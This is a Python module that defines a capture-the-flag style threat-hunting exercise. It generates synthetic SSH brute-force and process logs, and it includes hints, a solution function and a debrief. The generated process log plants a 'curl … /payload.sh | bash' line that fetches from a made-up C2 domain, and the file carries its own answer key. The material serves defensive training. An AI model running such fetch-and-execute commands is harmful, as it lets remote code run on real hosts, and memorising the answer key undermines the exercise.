"""Mission hunt-01: Hunt the intrusion (Layer 6 - The Hunt / blue team).

Correlate two logs like a SOC analyst: find which account was brute-forced into, then
find THAT account's malicious process and the C2 domain it contacted. Pure log analysis
with grep/awk - the defender's side of every attack in this course.
"""
import random
from pathlib import Path

from .base import Mission

SEED = 0x40D5EC
USERS = ["webadmin", "deploy", "backup", "monitor", "jsmith"]
BENIGN_DOMAINS = ["updates.internal", "apt.ubuntu.com", "registry.npmjs.org",
                  "pkgs.internal", "time.cloudflare.com"]


def _generate(write_to=None):
    rng = random.Random(SEED)
    attacker_ip = "185." + ".".join(str(rng.randint(1, 254)) for _ in range(3))
    victim = rng.choice(USERS)
    c2 = "cdn-" + "".join(rng.choice("abcdef0123456789") for _ in range(6)) + ".xyz"
    t = 1760200000
    auth, proc = [], []
    # benign accepted logins scattered in
    for _ in range(30):
        t += rng.randint(5, 60)
        u = rng.choice(USERS)
        ip = "10.0." + str(rng.randint(0, 5)) + "." + str(rng.randint(2, 200))
        auth.append(f"{t} sshd: Accepted password for {u} from {ip} port 22")
    # the brute force: many failures against the victim from the attacker, then success
    for _ in range(40):
        t += rng.randint(1, 3)
        auth.append(f"{t} sshd: Failed password for {victim} from {attacker_ip} port 22")
    t += 2
    auth.append(f"{t} sshd: Accepted password for {victim} from {attacker_ip} port 22")
    # process log: benign curls by various users + the victim's malicious curl|bash to C2
    for _ in range(25):
        t += rng.randint(2, 40)
        u = rng.choice(USERS)
        proc.append(f"{t} host01 user={u} parent=cron cmd=curl -s https://{rng.choice(BENIGN_DOMAINS)}/check")
    t += 5
    proc.append(f"{t} host01 user={victim} parent=bash cmd=curl -s http://{c2}/payload.sh | bash")
    for _ in range(10):
        t += rng.randint(2, 40)
        proc.append(f"{t} host01 user={rng.choice(USERS)} parent=bash cmd=ls -la")
    rng.shuffle(auth)
    rng.shuffle(proc)
    if write_to is not None:
        (write_to / "auth.log").write_text("\n".join(auth) + "\n")
        (write_to / "proc.log").write_text("\n".join(proc) + "\n")
    return victim, c2


def setup(workdir: Path):
    _generate(workdir)
    (workdir / "START_HERE.txt").write_text(
        "You're the on-call analyst. Two logs:\n"
        "  auth.log  SSH login attempts (Failed/Accepted password for <user> from <ip>)\n"
        "  proc.log  processes that ran (user=, parent=, cmd=)\n\n"
        "One external IP brute-forced an account and got in, and that account then ran a\n"
        "malicious command that beacons to a command-and-control (C2) domain. Find the\n"
        "COMPROMISED USER and the C2 DOMAIN it contacted. Submit flag{user:domain}.\n"
        "The other curl commands are benign (internal/package mirrors) - don't be fooled.\n")


def solution(workdir: Path) -> str:
    victim, c2 = _generate(None)
    return f"flag{{{victim}:{c2}}}"


MISSION = Mission(
    id="hunt-01",
    layer="6 The Hunt",
    title="Hunt the intrusion",
    difficulty="medium",
    goal="Correlate auth.log and proc.log: find the brute-forced account and the C2 domain "
         "its malicious process contacted. Submit flag{user:domain}.",
    flag_format="flag{user:domain}",
    setup=setup,
    solution=solution,
    tools=["grep", "awk", "sort", "uniq"],
    hints=[
        "Step 1 - who got brute-forced? Count 'Failed password' per user/IP: "
        "grep 'Failed password' auth.log | awk '{print $6, $8}' | sort | uniq -c | sort -rn | head. "
        "The user with a huge pile of failures AND a later 'Accepted password' from the same IP is compromised.",
        "Step 2 - what did that user run? grep 'user=<victim>' proc.log and look at the cmd= field.",
        "The malicious line is a curl piped to bash fetching from an external domain (not an "
        "internal/package mirror). That domain is the C2. Flag is flag{victim:domain}.",
    ],
    debrief=(
        "That's threat hunting: a brute-force leaves a loud trail (many failures + a success "
        "from one IP), and the payload stage shows up as an odd process (curl|bash to an unknown "
        "domain). Every attack you ran earlier in this course looks like THIS from the defender's "
        "chair. Real detections automate it: fail-count thresholds, alerts on curl|bash, and "
        "flagging connections to young/unknown domains. You can attack AND catch it now."),
)
